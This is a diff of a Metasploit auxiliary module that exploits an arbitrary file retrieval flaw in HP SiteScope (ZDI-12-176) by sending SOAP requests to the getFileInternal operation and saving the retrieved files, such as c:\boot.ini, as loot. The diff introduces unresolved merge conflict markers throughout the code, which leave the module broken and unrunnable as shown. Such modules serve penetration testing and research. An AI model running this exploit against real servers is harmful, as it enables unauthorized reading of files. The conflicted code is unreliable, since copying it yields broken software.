@@ -21,11 +21,19 @@ class Metasploit4 < Msf::Auxiliary
 				retrieve an arbitrary file from the remote server. It is accomplished by calling
 				the getFileInternal operation available through the APISiteScopeImpl AXIS service.
 				This module has been successfully tested on HP SiteScope 11.20 over Windows 2003
+<<<<<<< HEAD
 				SP2 and Linux Centos 6.3.
 			},
 			'References'   =>
 				[
 					[ 'OSVDB', '85119' ],
+=======
+				SP2.
+			},
+			'References'   =>
+				[
+					#[ 'OSVDB', '' ],
+>>>>>>> Added module for ZDI-12-176
 					[ 'BID', '55269' ],
 					[ 'URL', 'http://www.zerodayinitiative.com/advisories/ZDI-12-176/' ]
 				],
@@ -40,8 +48,13 @@ class Metasploit4 < Msf::Auxiliary
 		register_options(
 		[
 			Opt::RPORT(8080),
+<<<<<<< HEAD
 			OptString.new('RFILE', [true, 'Remote File', 'c:\\boot.ini']),
 			OptString.new('TARGETURI', [true, 'Path to SiteScope', '/SiteScope/'])
+=======
+			OptString.new('RFILE', [true, 'Remote File', 'c:\\boot.ini'])
+
+>>>>>>> Added module for ZDI-12-176
 		], self.class)
 
 		register_autofilter_ports([ 8080 ])
@@ -53,6 +66,7 @@ class Metasploit4 < Msf::Auxiliary
 	end
 
 	def run_host(ip)
+<<<<<<< HEAD
 		@peer = "#{rhost}:#{rport}"
 		@uri = target_uri.path
 		@uri << '/' if @uri[-1,1] != '/'
@@ -65,6 +79,14 @@ class Metasploit4 < Msf::Auxiliary
 
 		if not res
 			print_error("#{@peer} - Unable to connect")
+=======
+		res = send_request_cgi({
+			'uri'     => '/SiteScope/services/APISiteScopeImpl',
+			'method'  => 'GET'})
+
+		if not res
+			print_error("#{rhost}:#{rport} - Unable to connect")
+>>>>>>> Added module for ZDI-12-176
 			return
 		end
 
@@ -72,7 +94,11 @@ class Metasploit4 < Msf::Auxiliary
 	end
 
 	def accessfile
+<<<<<<< HEAD
 		print_status("#{@peer} - Retrieving the target hostname")
+=======
+		print_status("#{rhost}:#{rport} - Retrieving the target hostname")
+>>>>>>> Added module for ZDI-12-176
 
 		data = "<?xml version='1.0' encoding='UTF-8'?>" + "\r\n"
 		data << "<wsns0:Envelope" + "\r\n"
@@ -101,7 +127,11 @@ class Metasploit4 < Msf::Auxiliary
 		data << "</wsns0:Envelope>"
 
 		res = send_request_cgi({
+<<<<<<< HEAD
 			'uri'      => "#{@uri}services/APISiteScopeImpl",
+=======
+			'uri'      => '/SiteScope/services/APISiteScopeImpl',
+>>>>>>> Added module for ZDI-12-176
 			'method'   => 'POST',
 			'ctype'    => 'text/xml; charset=UTF-8',
 			'data'     => data,
@@ -114,11 +144,19 @@ class Metasploit4 < Msf::Auxiliary
 		end
 
 		if not host_name or host_name.empty?
+<<<<<<< HEAD
 			print_error("#{@peer} - Failed to retrieve the host name")
 			return
 		end
 
 		print_status("#{@peer} - Retrieving the file contents")
+=======
+			print_error("#{rhost}#{rport} - Failed to retrieve the host name")
+			return
+		end
+
+		print_status("#{rhost}:#{rport} - Retrieving the file contents")
+>>>>>>> Added module for ZDI-12-176
 
 		data = "<?xml version='1.0' encoding='UTF-8'?>" + "\r\n"
 		data << "<wsns0:Envelope" + "\r\n"
@@ -145,7 +183,11 @@ class Metasploit4 < Msf::Auxiliary
 		data << "</wsns0:Envelope>"
 
 		res = send_request_cgi({
+<<<<<<< HEAD
 			'uri'      => "#{@uri}services/APISiteScopeImpl",
+=======
+			'uri'      => '/SiteScope/services/APISiteScopeImpl',
+>>>>>>> Added module for ZDI-12-176
 			'method'   => 'POST',
 			'ctype'    => 'text/xml; charset=UTF-8',
 			'data'     => data,
@@ -159,7 +201,11 @@ class Metasploit4 < Msf::Auxiliary
 				boundary = $1
 			end
 			if not boundary or boundary.empty?
+<<<<<<< HEAD
 				print_error("#{@peer} - Failed to retrieve the file contents")
+=======
+				print_error("#{rhost}#{rport} - Failed to retrieve the File contents")
+>>>>>>> Added module for ZDI-12-176
 				return
 			end
 
@@ -167,7 +213,11 @@ class Metasploit4 < Msf::Auxiliary
 				cid = $1
 			end
 			if not cid or cid.empty?
+<<<<<<< HEAD
 				print_error("#{@peer} - Failed to retrieve the file contents")
+=======
+				print_error("#{rhost}#{rport} - Failed to retrieve the File contents")
+>>>>>>> Added module for ZDI-12-176
 				return
 			end
 
@@ -175,17 +225,29 @@ class Metasploit4 < Msf::Auxiliary
 				loot = Rex::Text.ungzip($1)
 			end
 			if not loot or loot.empty?
+<<<<<<< HEAD
 				print_error("#{@peer} - Failed to retrieve the file contents")
+=======
+				print_error("#{rhost}#{rport} - Failed to retrieve the File contents")
+>>>>>>> Added module for ZDI-12-176
 				return
 			end
 
 			f = ::File.basename(datastore['RFILE'])
 			path = store_loot('hp.sitescope.file', 'application/octet-stream', rhost, loot, f, datastore['RFILE'])
+<<<<<<< HEAD
 			print_status("#{@peer} - #{datastore['RFILE']} saved in #{path}")
 			return
 		end
 
 		print_error("#{@peer} - Failed to retrieve the file contents")
+=======
+			print_status("#{rhost}:#{rport} - #{datastore['RFILE']} saved in #{path}")
+			return
+		end
+
+		print_error("#{rhost}#{rport} - Failed to retrieve the File contents")
+>>>>>>> Added module for ZDI-12-176
 	end
 
 end
